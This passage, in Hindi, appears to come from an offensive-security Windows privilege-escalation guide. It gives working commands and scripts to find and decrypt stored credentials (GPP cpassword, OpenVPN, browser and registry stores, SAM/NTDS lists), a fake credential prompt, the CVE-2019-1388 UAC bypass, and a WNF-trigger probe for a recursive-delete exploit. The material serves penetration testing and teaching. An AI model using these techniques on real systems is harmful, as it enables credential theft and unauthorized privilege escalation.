इस जोखिम को कम करने के लिए, एक ऐसा function विकसित किया गया जो स्थानीय रूप से cached GPP फ़ाइलों में खाली न होने वाले "cpassword" field को खोजता है। ऐसी फ़ाइल मिलने पर, function पासवर्ड decrypt करके एक कस्टम PowerShell object लौटाता है। इस object में GPP और फ़ाइल की location का विवरण शामिल होता है, जिससे इस सुरक्षा कमज़ोरी की पहचान और उसे ठीक करने में मदद मिलती है।

इन फ़ाइलों को `C:\ProgramData\Microsoft\Group Policy\history` या _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (W Vista से पहले)_ में खोजें:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**cPassword decrypt करने के लिए:**

```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```

पासवर्ड प्राप्त करने के लिए crackmapexec का उपयोग करना:

```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```

### IIS Web Config

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

क्रेडेंशियल्स वाले web.config का उदाहरण:

```xml
<authentication mode="Forms">
    <forms name="login" loginUrl="/admin">
        <credentials passwordFormat = "Clear">
            <user name="Administrator" password="SuperAdminPassword" />
        </credentials>
    </forms>
</authentication>
```

### IIS webroot में backup archives

सीधे served webroot में रखा पुराना ZIP backup, पिछली configuration files और दोबारा इस्तेमाल किए जा सकने वाले credentials उजागर कर सकता है। इसे exposure मानने से पहले साइट का configured physical path जांचें और पुष्टि करें कि archive वास्तव में HTTP के ज़रिए पहुंच योग्य है। Default `C:\inetpub\wwwroot` path केवल एक संभावित स्थान है। एक त्वरित local inventory, archives खोले बिना, नाम और आकार सूचीबद्ध कर सकता है:

```powershell
Get-ChildItem -LiteralPath 'C:\inetpub\wwwroot' -File -Filter '*.zip' -ErrorAction SilentlyContinue |
  Where-Object Name -Match 'backup' | Select-Object Name, Length
```

आर्काइव का नाम यह साबित नहीं करता कि उसमें कोई secret है या उससे recovered credential से higher privilege मिलता है।

### OpenVPN credentials

```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
  $encryptedbytes=$item.'auth-data'
  $entropy=$item.'entropy'
  $entropy=$entropy[0..(($entropy.Length)-2)]

  $decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
    $encryptedBytes,
    $entropy,
    [System.Security.Cryptography.DataProtectionScope]::CurrentUser)

  Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```

### लॉग्स

```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```

### क्रेडेंशियल्स माँगें

अगर आपको लगता है कि उपयोगकर्ता अपने क्रेडेंशियल्स या किसी दूसरे उपयोगकर्ता के क्रेडेंशियल्स जानता हो सकता है, तो आप हमेशा उससे उन्हें **दर्ज करने के लिए कह सकते हैं** (ध्यान दें कि क्लाइंट से सीधे **क्रेडेंशियल्स** **माँगना** वाकई **जोखिम भरा** है):

```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```

### **क्रेडेंशियल्स वाली संभावित फ़ाइलों के नाम**

ज्ञात फ़ाइलें जिनमें पहले **पासवर्ड** **सादे टेक्स्ट** या **Base64** में मौजूद थेેણ

```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
*.psafe3
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```

Password Safe v3 डेटाबेस में आमतौर पर `.psafe3` extension का उपयोग होता है। मिलते-जुलते filename को encrypted vault का संभावित उम्मीदवार मानें; इसकी मौजूदगी से यह साबित नहीं होता कि आप इसे पढ़ सकते हैं, unlock कर सकते हैं या इसमें संग्रहीत credentials का उपयोग कर सकते हैं। ऐसी फ़ाइलें कहाँ संग्रहीत हैं, इसकी समीक्षा करते समय उन user profiles की जाँच करें जिन तक आपकी पहुँच है और configured file-sharing roots भी देखें।

पढ़ने योग्य KeePass `.kdbx` भी केवल एक encrypted-vault lead है। इसे unlock करने के लिए वास्तविक master-password और कोई भी configured key-file या account factors आवश्यक हैं। यदि authorized review में किसी entry में LM:NT hash pair मिलता है, तो [pass-the-hash](../ntlm/README.md#pass-the-hash) पर विचार करने से पहले बताए गए account और यह सत्यापित करें कि NT hash मौजूदा है और target की NTLM service उसे स्वीकार करती है। Vault entry अपने-आप Administrator या SYSTEM अधिकार नहीं देती; remote service access, account rights और service-execution का कोई अलग चरण भी आवश्यक है। Inventory में vault path और उसकी readability की जानकारी दें, डेटाबेस या संग्रहीत credentials न छापें।

सभी प्रस्तावित फ़ाइलें खोजें:

```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == *.psafe3 == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```

### RecycleBin में credentials

हटाए गए backups और configuration archives के साथ-साथ उन files के लिए भी उपलब्ध Recycle Bin entries जांचें जिनके नाम में स्पष्ट रूप से credentials का उल्लेख हो। कोई उपयोगी `.7z`, `.zip`, या `.rar` backup महीनों पुराना हो सकता है और उसका filename साधारण हो सकता है। Windows मूल path और deletion time को `$I` record में तथा हटाई गई file को उसके paired `$R` entry के रूप में संग्रहित करता है; archive खोलने से पहले metadata और वर्तमान identity की read access जांचें। क्या दिखाई देता है, यह volume, user SID और file permissions पर निर्भर करता है, इसलिए खाली listing से यह साबित नहीं होता कि कोई recoverable backup मौजूद नहीं है। Archive के नाम को जांच के लिए संभावित उम्मीदवार मानें, न कि इस बात का प्रमाण कि उसमें कोई मान्य secret है।

उपलब्ध हटाई गई `.pfx` file **code-signing** की संभावना भी दिखा सकती है। यदि उसमें accessible private key है, तो उस key से बदली हुई PowerShell script पर हस्ताक्षर किए जा सकते हैं; [PowerShell के लिए private key वाला code-signing certificate आवश्यक है](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/set-authenticodesignature), और [AppLocker publisher rules, signer की identity और rule scope का मूल्यांकन करते हैं](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/understanding-the-publisher-rule-condition-in-applocker)। दूसरे account के अंतर्गत execution के लिए आवश्यक है कि वर्तमान identity सटीक script को modify कर सके, लागू rule उस script और target account के लिए परिणामी signature को स्वीकार करे, और कोई scheduled task या अन्य higher-privilege consumer वास्तव में उसे चलाए। केवल `.pfx` filename, certificate subject या writable script से यह पूरी कड़ी साबित नहीं होती। Private-key material खोलने या task चलाने से पहले metadata, ACLs, policy और scheduled command की जांच करें।

Credentials से जुड़े संकेतों के लिए उपलब्ध messaging-client profile databases, notes और प्राप्त files की भी जांच करें। BitLocker recovery export HTML या TXT के रूप में, कभी-कभी नाम वाले backup archive के भीतर, संग्रहित हो सकता है। ऐसी सामग्री किसी अलग encrypted data volume तक पहुंच दे सकती है, जिसमें पुराने backups हों; volume और archive की जांच केवल तभी करें जब इसकी अनुमति हो। यदि किसी backup में `NTDS.dit` है, तो offline domain credential recovery के लिए उससे मेल खाता `SYSTEM` hive भी आवश्यक है, जैसा कि [backup और privileged-groups workflow](../active-directory-methodology/privileged-groups-and-token-privileges.md) में बताया गया है। केवल filenames और locked volume से यह साबित नहीं होता कि कोई उपयोगी recovery key या domain backup मौजूद है।

कई programs में सहेजे गए **passwords recover** करने के लिए आप इसका उपयोग कर सकते हैं: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### Registry के अंदर

**Credentials वाली अन्य संभावित registry keys**

```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```

[**registry से openssh keys निकालें।**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### ब्राउज़र हिस्ट्री

आपको उन dbs की जाँच करनी चाहिए जहाँ **Chrome, Edge, या Firefox** के passwords संग्रहीत होते हैं।\
ब्राउज़रों की हिस्ट्री, bookmarks और favourites भी जाँचें; हो सकता है कि वहाँ कुछ **passwords संग्रहीत हों**।

वर्तमान उपयोगकर्ता की सामान्य Edge **Default** profile के लिए, `Login Data` `%LOCALAPPDATA%\Microsoft\Edge\User Data\Default` में होता है, जबकि `Local State` इसकी parent `User Data` directory में होता है। [Microsoft default profile location को दस्तावेज़ित करता है](https://learn.microsoft.com/en-us/deployedge/edge-learnmore-create-user-directory-vars); कोई दूसरी profile या `UserDataDir` policy इसका स्थान बदल सकती है। फ़ाइलों का मौजूद होना केवल credential store का एक संकेत है: पुष्टि करें कि फ़ाइलें पढ़ी जा सकती हैं, लागू उपयोगकर्ता का DPAPI context या अन्य अधिकृत key material उपलब्ध है, और सहेजा गया login किसी अधिक privileged account का है या नहीं। केवल path की enumeration के लिए database खोलना या decrypted passwords दिखाना आवश्यक नहीं है।

Firefox के लिए, [Mozilla दस्तावेज़ित करता है](https://support.mozilla.org/en-US/kb/recovering-important-data-from-an-old-profile) कि profile की `key4.db` और `logins.json` क्रमशः paired key और encrypted-login फ़ाइलें हैं। इनका मौजूद होना केवल एक संकेत है: जाँचें कि दोनों फ़ाइलें पढ़ी जा सकती हैं या नहीं, सहेजी गई entries मौजूद हैं या नहीं, और निष्कर्ष निकालने से पहले कि credentials उपयोग योग्य हैं या नहीं, जाँचें कि key को Primary Password से सुरक्षित किया गया है या नहीं। यदि recovered credential किसी domain account का है, तो उस account के प्रभावी group-control rights और समूह के [LAPS password read या decrypt rights](../active-directory-methodology/laps.md) की अलग-अलग समीक्षा करें; केवल browser artifacts से administrator path साबित नहीं होता।

ब्राउज़रों से passwords निकालने के tools:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)** Windows operating system में बनी एक technology है, जो अलग-अलग languages के software components के बीच **intercommunication** की अनुमति देती है। हर COM component की पहचान एक **class ID (CLSID)** से होती है और हर component एक या अधिक interfaces के माध्यम से functionality उपलब्ध कराता है, जिनकी पहचान interface IDs (IIDs) से होती है।

COM classes और interfaces क्रमशः registry में **HKEY\CLASSES\ROOT\CLSID** और **HKEY\CLASSES\ROOT\Interface** के अंतर्गत परिभाषित होते हैं। यह registry **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT** को merge करके बनाई जाती है।

इस registry के CLSIDs के अंदर आपको child registry **InProcServer32** मिल सकती है, जिसमें एक **default value** होती है जो **DLL** की ओर point करती है और `ThreadingModel` नाम की एक value होती है, जो **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single या Multi) या **Neutral** (Thread Neutral) हो सकती है।

![ब्राउज़र हिस्ट्री - COM DLL Overwriting: इस registry के CLSIDs के अंदर आपको child registry InProcServer32 मिल सकती है, जिसमें एक default value होती है जो DLL की ओर point करती है और एक value...](<../../images/image (729).png>)

मूल रूप से, यदि आप **execute होने वाली किसी भी DLL को overwrite** कर सकते हैं, तो आप **privileges escalate** कर सकते हैं, यदि उस DLL को कोई दूसरा उपयोगकर्ता execute करने वाला हो।

यह जानने के लिए कि attackers persistence mechanism के रूप में COM Hijacking का उपयोग कैसे करते हैं, देखें:


{{#ref}}
com-hijacking.md
{{#endref}}

### **files और registry में generic Password खोज**

**फ़ाइलों के contents खोजें**

```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```

**किसी खास फ़ाइलनाम वाली फ़ाइल खोजें**

```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```

**Key names और passwords के लिए registry में search करें**

```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```

### Passwords खोजने वाले Tools

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **एक msf** plugin है। मैंने यह plugin **victim** के अंदर credentials खोजने वाले हर Metasploit POST module को **automatically execute** करने के लिए बनाया है।\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) इस page पर बताए गए passwords वाली सभी files को automatically खोजता है।\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) किसी system से password निकालने के लिए एक और बेहतरीन tool है।

[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) कई ऐसे tools के **sessions**, **usernames** और **passwords** खोजता है जो यह data plain text में save करते हैं (PuTTY, WinSCP, FileZilla, SuperPuTTY और RDP)।

```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```

## Leaked Handlers

कल्पना करें कि **SYSTEM के रूप में चल रही कोई process full access के साथ एक नई process खोलती है** (`OpenProcess()`)। वही process **कम privileges के साथ एक नई process भी बनाती है** (`CreateProcess()`), जो **मुख्य process के सभी खुले handles विरासत में प्राप्त करती है**।\
फिर, यदि आपके पास **कम privileges वाली process का full access** है, तो आप `OpenProcess()` से बनाई गई privileged process का **खुला handle प्राप्त करके उसमें shellcode inject कर सकते हैं**।\
[इस vulnerability का पता लगाने और इसका exploit करने के तरीके के बारे में अधिक जानकारी के लिए यह उदाहरण पढ़ें।](leaked-handle-exploitation.md)\
[अलग-अलग permissions वाले (सिर्फ full access वाले नहीं) processes और threads से विरासत में मिले अधिक खुले handles की जाँच और दुरुपयोग करने की पूरी व्याख्या के लिए यह **दूसरी पोस्ट पढ़ें**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/)।

## Named Pipe Client Impersonation

Shared memory segments, जिन्हें **pipes** कहा जाता है, processes के बीच communication और data transfer को सक्षम बनाते हैं।

Windows में **Named Pipes** नाम की सुविधा है, जो असंबंधित processes को अलग-अलग networks पर भी data share करने देती है। यह client/server architecture जैसा है, जिसमें भूमिकाएँ **named pipe server** और **named pipe client** के रूप में निर्धारित होती हैं।

जब **client** किसी pipe के ज़रिए data भेजता है, तो pipe सेट करने वाला **server**, **client की identity अपनाने** में सक्षम होता है—बशर्ते उसके पास आवश्यक **SeImpersonate** rights हों। ऐसे **privileged process** की पहचान करना जो उस pipe के ज़रिए communicate करता हो जिसकी आप नकल कर सकते हैं, **अधिक privileges हासिल करने** का अवसर देता है: जब वह process आपके बनाए pipe के साथ interact करे, तो आप उसकी identity अपना सकते हैं। इस तरह का attack करने के निर्देशों के लिए उपयोगी guides [**यहाँ**](named-pipe-client-impersonation.md) और [**यहाँ**](#from-high-integrity-to-system) मिल सकते हैं।

यह tool भी आपको burp जैसे tool से **named pipe communication intercept करने देता है:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **और यह tool privescs खोजने के लिए सभी pipes की सूची और जानकारी देता है** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

Server mode में Telephony service (TapiSrv), `\\pipe\\tapsrv` (MS-TRP) को expose करती है। कोई remote authenticated client, mailslot-आधारित async event path का दुरुपयोग करके `ClientAttach` को `NETWORK SERVICE` द्वारा writable किसी भी मौजूदा file पर मनमाना **4-byte write** करने के लिए इस्तेमाल कर सकता है। इसके बाद Telephony admin rights हासिल करके service के रूप में मनमानी DLL load की जा सकती है। पूरी प्रक्रिया:

- `pszDomainUser` को किसी writable मौजूदा path पर सेट करके `ClientAttach` करें → service उसे `CreateFileW(..., OPEN_EXISTING)` के ज़रिए खोलती है और async event writes के लिए इस्तेमाल करती है।
- हर event, `Initialize` से attacker-controlled `InitContext` को उस handle पर लिखता है। `LRegisterRequestRecipient` (`Req_Func 61`) से line app register करें, `TRequestMakeCall` (`Req_Func 121`) trigger करें, `GetAsyncEvents` (`Req_Func 0`) से प्राप्त करें, फिर deterministic writes दोहराने के लिए unregister/shutdown करें।
- `C:\Windows\TAPI\tsec.ini` में `[TapiAdministrators]` के तहत खुद को जोड़ें, reconnect करें, फिर किसी मनमाने DLL path के साथ `GetUIDllName` call करें, ताकि `NETWORK SERVICE` के रूप में `TSPI_providerUIIdentify` execute हो।

अधिक जानकारी:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## विविध

### Windows में execute हो सकने वाली File Extensions

यह page देखें **[https://filesec.io/](https://filesec.io/)**

### Markdown renderers के ज़रिए Protocol handler / ShellExecute का दुरुपयोग

`ShellExecuteExW` को भेजे गए clickable Markdown links खतरनाक URI handlers (`file:`, `ms-appinstaller:` या कोई भी registered scheme) trigger कर सकते हैं और मौजूदा user के रूप में attacker-controlled files execute कर सकते हैं। देखें:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Passwords के लिए Command Lines की Monitoring**

किसी user के रूप में shell मिलने पर, scheduled tasks या अन्य processes execute हो सकती हैं जो **command line पर credentials pass करती हैं**। नीचे दी गई script हर दो seconds में process command lines capture करती है और मौजूदा state की पिछली state से तुलना करके कोई भी अंतर output करती है।

```bash
while($true)
{
  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 1
  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```

## Processes से passwords चुराना

## कम विशेषाधिकार वाले यूज़र से NT\AUTHORITY SYSTEM तक (CVE-2019-1388) / UAC Bypass

अगर आपको graphical interface (console या RDP के ज़रिए) का access है और UAC enabled है, तो Microsoft Windows के कुछ versions में किसी unprivileged user से terminal या कोई अन्य process, जैसे "NT\AUTHORITY SYSTEM", चलाना संभव है।

इससे एक ही vulnerability का इस्तेमाल करके privileges escalate करना और UAC bypass करना, दोनों संभव हो जाते हैं। इसके अलावा, कुछ भी install करने की ज़रूरत नहीं है और इस प्रक्रिया में इस्तेमाल की गई binary Microsoft द्वारा signed और जारी की गई है।

प्रभावित systems में से कुछ ये हैं:

```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```

इस vulnerability का exploit करने के लिए, निम्नलिखित steps पूरे करना आवश्यक है:

```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```

आपके पास इस GitHub repository में सभी आवश्यक फ़ाइलें और जानकारी हैं:

https://github.com/jas502n/CVE-2019-1388<sup>[[35]](#references)</sup>

## Administrator Medium से High Integrity Level तक / UAC Bypass

**Integrity Levels** के बारे में जानने के लिए इसे पढ़ें:


{{#ref}}
integrity-levels.md
{{#endref}}

फिर **UAC और UAC bypasses** के बारे में जानने के लिए इसे पढ़ें:


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Served Root में Upload Directory Junctions

कोई application अनुमान लगाने योग्य upload subdirectory बना सकता है, उसमें caller द्वारा दिया गया filename लिख सकता है और फिर उस फ़ाइल को process कर सकता है। यदि server-side write से पहले low-privilege user उस subdirectory को हटाकर उसकी जगह NTFS junction बना सकता है, तो write junction के ज़रिए web-served directory में जा सकता है। वहाँ रखी script web-service identity के रूप में चल सकती है, यदि server उस file type को execute करता हो। यह application-specific arbitrary-write boundary है; केवल writable upload directory या पहले से मौजूद junction इसका प्रमाण नहीं है।

Upload handler में सटीक path construction और timing, subdirectory पर user के प्रभावी delete/create rights, destination की प्रभावी ACLs, writer द्वारा reparse points को follow किए जाने और उस destination में web server द्वारा files execute किए जाने की जाँच करें। Writer और web server की process identities की अलग-अलग पुष्टि करें। Passive inventory से directory ACLs और reparse metadata दिख सकते हैं, लेकिन उससे handler का behavior या भविष्य में junction swap होना साबित नहीं होता। यदि execution किसी service account के रूप में होता है, तो किसी अलग token-privilege path पर विचार करने से पहले **वास्तविक process token** जाँचें।

## WNF-triggered privileged scheduled-task cleanup

जो scheduled task manual execution से इनकार करता है, उसमें भी unprivileged trigger हो सकता है। किसी privileged task का audit करते समय उसका XML export करें और task DACL, principal और action के साथ **सभी** triggers की जाँच करें। विशेष रूप से, `WnfStateChangeTrigger` में Windows Notification Facility (WNF) state का नाम होता है; यदि वह securable state मौजूदा user को update publish करने की अनुमति देती है, तो user `<AllowStartOnDemand>false</AllowStartOnDemand>` होने के बावजूद task को उसकी configured identity के अंतर्गत अप्रत्यक्ष रूप से शुरू कर सकता है।<sup>[[43]](#references)</sup>

उदाहरण के लिए, Recall `\Microsoft\Windows\WindowsAI\Recall\PolicyConfiguration` task SYSTEM के रूप में चलता था, standard user से WNF state `7508BCA32C079E41` में updates स्वीकार करता था, और Recall disabled होने पर भी `%LOCALAPPDATA%\CoreAIPlatform.00\UKP\{GUID}` की जाँच करता था।<sup>[[43]](#references)</sup>

```powershell
schtasks /query /tn "<TASK>" /xml > task.xml
Select-String -Path .\task.xml -Pattern 'WnfStateChangeTrigger|StateName|UserId|ClassId|AllowStartOnDemand'
```

Reachability जाँचने के लिए, `ntdll.dll` से `ZwUpdateWnfStateData` resolve करें, आठ-बाइट वाले state name के लिए empty update सबमिट करें, और लौटाए गए status का मिलान task के last-run data या Procmon activity से करें। नीचे दिया गया reduced probe, Recall task के उदाहरण से byte sequence का उपयोग करता है; परीक्षण किए जा रहे task के लिए export किए गए bytes का उपयोग करें।<sup>[[43]](#references)</sup>

```c
#include <windows.h>
#include <winternl.h>
typedef NTSTATUS (WINAPI *UpdateWnf)(PVOID,PVOID,ULONG,PVOID,PVOID,PVOID,ULONG);
int main(void) {
    unsigned char stateName[8] = {0x75,0x08,0xBC,0xA3,0x2C,0x07,0x9e,0x41};
    HMODULE ntdll = LoadLibraryW(L"ntdll.dll");
    UpdateWnf update = (UpdateWnf)GetProcAddress(ntdll, "ZwUpdateWnfStateData");
    if (!update) return 1;
    return update(stateName, NULL, 0, NULL, NULL, NULL, 0) < 0;
}
```

### Privileged deletion में recursive cleanup का उपयोग

उपयोगी primitive केवल trigger नहीं, बल्कि attacker-controlled directory स्वीकार करने वाला privileged cleanup routine है। Enumeration से लेकर अंतिम mutation तक operation को trace करें: profile/session discovery, wildcard से चुने गए children, `SHCreateItemFromParsingName`, और `IFileOperation::DeleteItem` इस बात के मजबूत संकेत हैं कि पहले जाँचे गए pathname को बाद में recursively traverse किया जाएगा। यदि descendants को trusted directory handles के सापेक्ष open करके deletion से पहले validate नहीं किया जाता, तो attacker enumeration और उपयोग के बीच resolution बदल सकता है।<sup>[[43]](#references)</sup>

नीचे बताए गए [oplock, junction और Object Manager symlink substitution](#from-folder-contents-delete-to-system-eop) के साथ WNF trigger का उपयोग करें: oplock cleaner को legitimate child चुनने के बाद रोकता है, जबकि writable ancestor को बदल दिया जाता है, ताकि दोबारा शुरू होने पर privileged delete `\RPC Control` के ज़रिए protected target तक resolve हो। Recall chain में इससे documented MSI rollback technique के लिए आवश्यक `C:\Config.Msi` को SYSTEM के रूप में delete किया जा सका।<sup>[[31]](#references)[[43]](#references)</sup>

### Nested descendants shallow reparse-point fixes को bypass करते हैं

केवल attacker-controlled root और उसके immediate child को validate करने से recursive pathname-based delete सुरक्षित नहीं होता। उन जाँचे गए objects को legitimate रखें और junction/oplock substitution को उनके नीचे एक अतिरिक्त child में ले जाएँ; `IFileOperation::DeleteItem` अंततः unvalidated descendant तक पहुँचकर उसके नए target को follow करता है। CVE-2026-20941 इसी तरह के अधूरे fix से बना था: पहले Recall patch ने `UKP` और GUID-जैसी directory को validate किया, लेकिन पुराना recursive deletion operation बनाए रखा।<sup>[[43]](#references)</sup>

सुरक्षित तरीका यह है कि **हर descendant** को पहले से trusted directory handle के सापेक्ष open करें, final resolved path/object प्राप्त करके verify करें, और deletion disposition उसी verified handle पर लागू करें। किसी prefix को validate करके फिर recursive path-based deletion पर वापस न जाएँ। Patch review के दौरान, वास्तविक call site पर मौजूद structures भी जाँचें: इस मामले में `NtCreateFile` पर `OBJECT_ATTRIBUTES` के runtime inspection से non-null `RootDirectory` और relative `{GUID}\\secure_file.lock` name दिखा, जिससे decompiler के उस भ्रामक output का खंडन हुआ जिसमें दूसरी `FILE_DELETE_ON_CLOSE` primitive का संकेत था।<sup>[[43]](#references)</sup>

## Arbitrary Folder Delete/Move/Rename से SYSTEM EoP तक

इस technique का वर्णन [**इस blog post में**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) किया गया है और इसका exploit code [**यहाँ उपलब्ध है**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs)।<sup>[[31]](#references)[[32]](#references)</sup>

यह attack मूल रूप से Windows Installer के rollback feature का दुरुपयोग करके uninstallation के दौरान legitimate files को malicious files से बदलता है। इसके लिए attacker को एक **malicious MSI installer** बनाना होता है, जिसका उपयोग `C:\Config.Msi` folder को hijack करने के लिए किया जाएगा। बाद में Windows Installer अन्य MSI packages को uninstall करते समय rollback files रखने के लिए इस folder का उपयोग करेगा; उन rollback files को malicious payload रखने के लिए संशोधित किया जा सकता है।

### Windows Installer COM cleanup-path injection (CVE-2025-27727)

